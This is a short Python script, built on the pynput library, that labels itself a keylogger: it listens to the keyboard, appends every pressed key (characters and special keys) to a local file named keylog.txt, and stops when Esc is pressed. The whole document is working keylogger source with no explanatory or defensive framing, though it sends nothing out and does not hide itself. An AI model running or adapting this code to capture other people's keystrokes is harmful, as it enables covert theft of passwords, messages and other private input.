#pip install pynput
from pynput import keyboard

# Define the log file path
log_file_path = "keylog.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file_path, "a") as log_file:
        log_file.write(f"{key}\n")

# Function to handle key press events
def on_press(key):
    try:
        # Record alphanumeric keys
        write_to_file(key.char)
    except AttributeError:
        # Record special keys
        write_to_file(f"{key}")

# Function to handle key release events
def on_release(key):
    # Stop the listener when 'esc' key is pressed
    if key == keyboard.Key.esc:
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
